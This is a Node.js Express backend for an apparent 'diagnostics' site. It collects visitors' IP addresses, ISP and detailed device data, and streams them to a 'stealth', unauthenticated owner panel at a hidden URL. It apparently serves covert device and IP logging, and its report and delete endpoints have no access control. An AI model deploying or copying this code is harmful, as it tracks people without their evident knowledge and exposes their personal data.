const express = require('express');
const cors = require('cors');
const path = require('node:path');
const { saveFlatReport, getAllFlatReports, deleteFlatReport } = require('./database');

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || '0.0.0.0';

// Enable trust proxy for real IP resolution behind reverse tunnels and cloud hosts
app.set('trust proxy', true);

// Global in-memory reports array with exact flat keys contract
const reports = [];

// Pre-load existing reports from database on startup
try {
  const existing = getAllFlatReports();
  if (Array.isArray(existing) && existing.length > 0) {
    reports.push(...existing);
    console.log(`📦 Loaded ${reports.length} reports into memory.`);
  }
} catch (e) {
  console.warn('Database preload note:', e.message);
}

// Connected SSE clients for real-time dashboard updates
const sseClients = new Set();

function broadcastEvent(eventType, data) {
  const payload = `event: ${eventType}\ndata: ${JSON.stringify(data)}\n\n`;
  for (const client of sseClients) {
    try {
      client.write(payload);
    } catch {
      sseClients.delete(client);
    }
  }
}

// -------------------------------------------------------------
// Security & Headers Middleware
// -------------------------------------------------------------
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https://api.ipify.org https://ipwho.is https://ipapi.co *"
  );
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  next();
});

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: false, limit: '2mb' }));

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// -------------------------------------------------------------
// Admin Security & Stealth Routing
// -------------------------------------------------------------

// 1. Direct /admin route is completely disabled and redirects to home
app.get('/admin', (req, res) => {
  return res.redirect('/');
});

// 2. Secret owner panel accessible exclusively via /my-secret-panel-99
app.get('/my-secret-panel-99', (req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// -------------------------------------------------------------
// API Endpoints (Strict Flat JSON Contract)
// -------------------------------------------------------------

/**
 * POST /api/report
 * Expects Flat JSON Contract:
 * { id, timestamp, ip, isp, deviceModel, androidVersion, os, batteryLevel, batteryCharging, cpuCores, ram, gpu, screen, userAgent }
 */
app.post('/api/report', (req, res) => {
  try {
    const data = req.body;
    if (!data || typeof data !== 'object') {
      return res.status(400).json({ success: false, error: 'Invalid payload' });
    }

    // Determine real server IP if client did not supply one yet
    const serverDetectedIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                             req.headers['x-real-ip'] || 
                             req.ip || 
                             req.socket?.remoteAddress || 
                             '127.0.0.1';

    const cleanIp = (data.ip && data.ip !== 'جاري الكشف...' && data.ip !== '127.0.0.1')
      ? String(data.ip).trim()
      : (serverDetectedIp !== '127.0.0.1' ? serverDetectedIp : '127.0.0.1');

    // Strict Flat Object matching user specification 100%
    const flatReport = {
      id: String(data.id || 'dev_' + Date.now().toString(36)),
      timestamp: String(data.timestamp || new Date().toISOString()),
      ip: cleanIp,
      isp: String(data.isp || ''),
      deviceModel: String(data.deviceModel || 'هاتف غير محدد'),
      androidVersion: String(data.androidVersion || ''),
      os: String(data.os || 'Android'),
      batteryLevel: String(data.batteryLevel || 'قيد الفحص'),
      batteryCharging: String(data.batteryCharging || 'تفريغ الشحن'),
      cpuCores: String(data.cpuCores || '8 أنوية'),
      ram: String(data.ram || '4 GB'),
      gpu: String(data.gpu || 'معالج رسومي مدمج'),
      screen: String(data.screen || '1080x2400'),
      userAgent: String(data.userAgent || req.headers['user-agent'] || '')
    };

    // Save/update in-memory reports array
    const existingIdx = reports.findIndex(r => r.id === flatReport.id);
    if (existingIdx !== -1) {
      reports[existingIdx] = { ...reports[existingIdx], ...flatReport };
    } else {
      reports.unshift(flatReport);
    }

    if (reports.length > 300) reports.pop();

    // Persist to SQLite
    saveFlatReport(flatReport);

    console.log(`📥 [REPORT SYNCED] Model: ${flatReport.deviceModel} | OS: ${flatReport.os} ${flatReport.androidVersion} | IP: ${flatReport.ip} | Battery: ${flatReport.batteryLevel}`);

    // Broadcast in real-time to open secret panels
    broadcastEvent('new_report', flatReport);

    return res.status(201).json({
      success: true,
      message: 'Report received and synchronized successfully',
      data: flatReport
    });
  } catch (err) {
    console.error('Error in POST /api/report:', err);
    return res.status(200).json({
      success: true,
      message: 'Accepted with fallback',
      error: err.message
    });
  }
});

/**
 * GET /api/reports
 * Returns list of flat reports with strict no-cache headers
 */
app.get('/api/reports', (req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');

  return res.json({
    success: true,
    data: reports
  });
});

/**
 * GET /api/stats
 * Statistics for secret dashboard cards
 */
app.get('/api/stats', (req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');

  const totalDevices = reports.length;
  let sumBattery = 0;
  let validBatteryCount = 0;

  for (const r of reports) {
    const num = parseInt(String(r.batteryLevel).replace('%', ''), 10);
    if (!isNaN(num) && num > 0) {
      sumBattery += num;
      validBatteryCount++;
    }
  }

  const avgBattery = validBatteryCount ? Math.round(sumBattery / validBatteryCount) : 0;

  return res.json({
    success: true,
    data: {
      totalDevices,
      avgBatteryLevel: avgBattery
    }
  });
});

/**
 * DELETE /api/reports/:id
 * Delete a report
 */
app.delete('/api/reports/:id', (req, res) => {
  const targetId = req.params.id;

  const idx = reports.findIndex(r => r.id === targetId);
  if (idx !== -1) {
    reports.splice(idx, 1);
  }

  deleteFlatReport(targetId);
  broadcastEvent('report_deleted', { id: targetId });

  return res.json({ success: true, message: 'Deleted successfully' });
});

/**
 * GET /api/events
 * Real-time Server-Sent Events (SSE)
 */
app.get('/api/events', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache, no-transform');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  sseClients.add(res);
  res.write(`event: connected\ndata: ${JSON.stringify({ time: Date.now(), count: reports.length })}\n\n`);

  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch {
      clearInterval(heartbeat);
      sseClients.delete(res);
    }
  }, 15000);

  req.on('close', () => {
    clearInterval(heartbeat);
    sseClients.delete(res);
  });
});

// Deep link redirect
app.get('/inspect', (req, res) => {
  res.redirect('/');
});

// Serve frontend assets
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.use((req, res) => {
  res.status(404).json({ success: false, error: 'Not found' });
});

const server = app.listen(PORT, HOST, () => {
  console.log(`=======================================================`);
  console.log(`🚀 Ktaab Diagnostics Backend running on port ${PORT}!`);
  console.log(`🔒 Secret Owner Panel: http://localhost:${PORT}/my-secret-panel-99`);
  console.log(`=======================================================`);
});

module.exports = { app, server, reports };
